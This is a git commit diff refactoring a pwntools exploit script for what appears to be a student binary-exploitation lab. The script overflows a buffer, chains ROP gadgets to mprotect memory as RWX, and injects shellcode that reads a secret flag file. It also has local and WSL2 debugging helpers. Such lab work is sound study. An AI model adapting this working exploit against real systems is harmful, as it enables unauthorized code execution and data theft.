99f2a6701d4cc203f5a2be7ac95a9e61080a3764
dedkuzmich <91969553+dedkuzmich@users.noreply.github.com>
2024-03-24 04:37:45 +0200

    Update and rename 10100_pwn.py to pwn_64.py

--- mkr1/pwn_64.py
+++ mkr1/pwn_64.py
@@ -1,10 +1,14 @@
 import os
 from pwn import *
 
+IP = "0.0.0.0"
+PORT = 0
+
 context.arch = "amd64"
 
-file_secret = "10100_ILIN_Mykola.secret"
-file_binary = "10100_ILIN_Mykola"
+file_secret = "secret.txt"
+file_binary = "10100_ILIN_Mykola_64"
+file_breakpoints = "breaks64.gdb"
 
 # GADGETS
 pop_rax = p64(0x449857)  # pop rax; ret
@@ -13,46 +17,44 @@ pop_rsi = p64(0x40f55e)  # pop rsi; ret
 pop_rdx = p64(0x40181f)  # pop rdx; ret
 add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret
 syscall = p64(0x485ac9)  # syscall; ret
-nop = p64(0x401d1f)
 
 
-def run_exploit(debug, file_breakpoints):
+def local(debug, wsl2):
     p = process(file_binary)
-    if debug == True:
-        pid = util.proc.pidof(p)[0]
+    if debug == False:
+        return p
+    if wsl2 == False:  # Debug in Linux
+        print("Waiting for debugger...")
+        pause()
+        return p
 
-        gdb = f"gdb -q -p {pid}"
-        if file_breakpoints:
-            gdb += f" -x {file_breakpoints}"
-            print(f"Use breakpoints from {file_breakpoints}")
+    # Debug in WSL2
+    pid = util.proc.pidof(p)[0]
+    gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
+    print(f"Gdb uses breakpoints from {file_breakpoints}")
 
-        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
-        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
-        cmd = f"cmd.exe /c start {new_tab} {wsl}"
-        os.system(cmd)
-        util.proc.wait_for_debugger(pid)
+    new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
+    wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
+    cmd = f"cmd.exe /c start {new_tab} {wsl}"
+    os.system(cmd)
+    util.proc.wait_for_debugger(pid)
     return p
 
 
-def padding():
-    buf = b""
-    buf += b"A" * 336
-    buf += p32(1337)
-    buf = buf.ljust(1672, b"B")
-    return buf
-
-
+# SET REGISTER
 def set_rax(value):
     buf = b""
     buf += pop_rax
     buf += p64(value)
     return buf
 
+
 def set_rdi(value):
     buf = b""
     buf += pop_rdi
     buf += p64(value)
     return buf
+
 
 def set_rsi(value):
     buf = b""
@@ -68,6 +70,7 @@ def set_rdx(value):
     return buf
 
 
+# CALL FUNCTION
 def sys_mprotect(address, length, protection):
     num_mprotect = 10
     buf = b""
@@ -103,19 +106,20 @@ def sys_read(fd, address, length):
 
 
 def main():
-    file_breakpoints = "breaks64.gdb"
-    p = run_exploit(True, file_breakpoints)
+    p = local(True, True)
+    # p = remote(IP, PORT)
     sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))
 
-    # Overflow
-    buf = b""
-    buf += padding()
+    # Buffer overflow (with return address overwriting)
+    buf = b"A" * 336
+    buf += p32(1337)
+    buf = buf.ljust(1672, b"B")
 
     # mprotect()
     rwx_addr = 0x400000
-    mem_page = 0x1000  # 1 RAM page = 4 KiB = 4096 bytes = 0x1000
+    rwx_length = 1 * 0x1000  # Should be multiple of 0x1000 = 4096 bytes = 1 RAM page
     rwx_mode = 7  # RWX = read | write | execute = 7
-    buf += sys_mprotect(rwx_addr, mem_page, rwx_mode)
+    buf += sys_mprotect(rwx_addr, rwx_length, rwx_mode)
 
     # read()
     stdin_fd = 0
@@ -135,7 +139,8 @@ def main():
     print(hexdump(sc))
     p.writeline(sc)
 
-    log.success(f"FLAG {p.readall().strip().decode()}")
+    flag = p.readall().strip().decode()
+    log.success(f"FLAG = {flag}")
 
 
 if __name__ == "__main__":
